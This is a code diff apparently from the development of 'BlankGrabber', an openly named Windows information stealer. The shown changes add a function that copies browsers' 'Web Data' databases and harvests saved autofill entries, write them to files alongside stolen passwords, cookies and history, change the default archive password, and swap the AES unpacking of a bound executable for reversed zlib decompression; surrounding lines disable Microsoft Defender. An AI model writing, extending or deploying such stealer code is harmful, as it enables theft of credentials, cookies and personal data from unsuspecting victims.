@@ -17,6 +17,7 @@ import traceback
 import time
 import ctypes
 import logging
+import zlib
 
 from threading import Thread
 from ctypes import wintypes
@@ -39,6 +40,7 @@ class Settings:
     CaptureWebcam = bool("%capturewebcam%")
     CapturePasswords = bool("%capturepasswords%")
     CaptureCookies = bool("%capturecookies%")
+    CaptureAutofills = bool("%captureautofills%")
     CaptureHistory = bool("%capturehistory%")
     CaptureDiscordTokens = bool("%capturediscordtokens%")
     CaptureGames = bool("%capturegames%")
@@ -578,7 +580,6 @@ class Browsers:
         
         def GetHistory(self) -> list[tuple[str, str, int]]: # Gets all browsing history of the browser
             history = list()
-
             historyFilePaths = list()
 
             for root, _, files in os.walk(self.BrowserPath):
@@ -615,6 +616,45 @@ class Browsers:
             
             history.sort(key= lambda x: x[3], reverse= True)
             return list([(x[0], x[1], x[2]) for x in history])
+
+        def GetAutofills(self) -> list[str]:
+            autofills = list()
+            autofillsFilePaths = list()
+
+            for root, _, files in os.walk(self.BrowserPath):
+                for file in files:
+                    if file.lower() == 'web data':
+                        filepath = os.path.join(root, file)
+                        autofillsFilePaths.append(filepath)
+            
+            for path in autofillsFilePaths:
+                while True:
+                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
+                    if not os.path.isfile(tempfile):
+                        break
+                
+                try:
+                    shutil.copy(path, tempfile)
+                except Exception:
+                    continue
+                db = sqlite3.connect(tempfile)
+                db.text_factory = lambda b : b.decode(errors= "ignore")
+                cursor = db.cursor()
+                try:
+                    results: list[str] = [x[0] for x in cursor.execute('SELECT value FROM autofill').fetchall()]
+
+                    for data in results:
+                        data = data.strip()
+                        if data and not data in autofills:
+                            autofills.append(data)
+                except Exception:
+                    pass
+                    
+                cursor.close()
+                db.close()
+                os.remove(tempfile)
+            
+            return autofills
 
 class Discord:
 
@@ -891,6 +931,7 @@ class BlankGrabber:
     Cookies: list = [] # List of cookies collected
     PasswordsCount: int = 0 # Number of passwords collected
     HistoryCount: int = 0 # Number of history collected
+    AutofillCount: int = 0 # Number of autofill data collected
     RobloxCookiesCount: int = 0 # Number of Roblox cookies collected
     DiscordTokensCount: int = 0 # Number of Discord tokens collected
     WifiPasswordsCount: int = 0 # Number of WiFi passwords collected
@@ -1345,7 +1386,7 @@ class BlankGrabber:
     
     @Errors.Catch
     def StealBrowserData(self) -> None: # Steal cookies, passwords and history from the browsers
-        if not any((Settings.CaptureCookies, Settings.CapturePasswords, Settings.CaptureHistory)):
+        if not any((Settings.CaptureCookies, Settings.CapturePasswords, Settings.CaptureHistory or Settings.CaptureAutofills)):
             return
         
         Logger.info("Stealing browser data")
@@ -1379,8 +1420,9 @@ class BlankGrabber:
                         passwords = browser.GetPasswords() if Settings.CapturePasswords else None
                         cookies = browser.GetCookies() if Settings.CaptureCookies else None
                         history = browser.GetHistory() if Settings.CaptureHistory else None
+                        autofills = browser.GetAutofills() if Settings.CaptureAutofills else None
 
-                        if passwords or cookies or history:
+                        if passwords or cookies or history or autofills:
                             os.makedirs(saveToDir, exist_ok= True)
 
                             if passwords:
@@ -1391,7 +1433,6 @@ class BlankGrabber:
                             
                             if cookies:
                                 output = ["{}\t{}\t{}\t{}\t{}\t{}\t{}".format(host, str(expiry != 0).upper(), cpath, str(not host.startswith(".")).upper(), expiry, cname, cookie) for host, cname, cpath, cookie, expiry in cookies]
-                                
                                 with open(os.path.join(saveToDir, "{} Cookies.txt".format(name)), "w", errors= "ignore", encoding= "utf-8") as file:
                                     file.write("\n".join(output))
                                 self.Cookies.extend([str(x[3]) for x in cookies])
@@ -1401,6 +1442,13 @@ class BlankGrabber:
                                 with open(os.path.join(saveToDir, "{} History.txt".format(name)), "w", errors= "ignore", encoding= "utf-8") as file:
                                     file.write(self.Separator.lstrip() + self.Separator.join(output))
                                 self.HistoryCount += len(history)
+                            
+                            if autofills:
+                                output = "\n".join(autofills)
+                                with open(os.path.join(saveToDir, "{} Autofills.txt".format(name)), "w", errors= "ignore", encoding= "utf-8") as file:
+                                    file.write(output)
+                                self.AutofillCount += len(autofills)
+
 
                     except Exception:
                         pass
@@ -1529,7 +1577,7 @@ class BlankGrabber:
         if Utility.GetSelf()[1] or os.path.isfile(rarPath):
             rarPath = os.path.join(sys._MEIPASS, "rar.exe")
             if os.path.isfile(rarPath):
-                password = Settings.ArchivePassword or "blank"
+                password = Settings.ArchivePassword or "blank123"
                 process = subprocess.run('{} a -r -hp"{}" "{}" *'.format(rarPath, password, self.ArchivePath), capture_output= True, shell= True, cwd= self.TempFolder)
                 if process.returncode == 0:
                     return "rar"
@@ -1609,6 +1657,7 @@ class BlankGrabber:
             "Passwords" : self.PasswordsCount,
             "Cookies" : len(self.Cookies),
             "History" : self.HistoryCount,
+            "Autofills" : self.AutofillCount,
             "Roblox Cookies" : self.RobloxCookiesCount,
             "Telegram Sessions" : self.TelegramSessionsCount,
             "Common Files" : self.CommonFilesCount,
@@ -1731,7 +1780,7 @@ if __name__ == "__main__" and os.name == "nt":
     Logger.info("Trying to disable defender")
     Utility.DisableDefender() # Tries to disable Defender
 
-    if Utility.GetSelf()[1] and not Utility.IsInStartup() and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.aes")):
+    if Utility.GetSelf()[1] and not Utility.IsInStartup() and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.blank")):
         try:
             Logger.info("Trying to extract bound file")
             if os.path.isfile(boundFileDst:= os.path.join(os.getenv("temp"), "bound.exe")): # Checks if any bound file exists (only for exe mode)
@@ -1740,7 +1789,7 @@ if __name__ == "__main__" and os.name == "nt":
 
             with open(boundFileSrc, "rb") as file:
                 content = file.read()
-            decrypted = pyaes.AESModeOfOperationGCM(content[:32], content[32:64]).decrypt(content[64:]) # Decrypt the file
+            decrypted = zlib.decompress(content[::-1]) # Decompress the file
             with open(boundFileDst, "wb") as file: # Copies bound file to the new location
                 file.write(decrypted)
             del content, decrypted
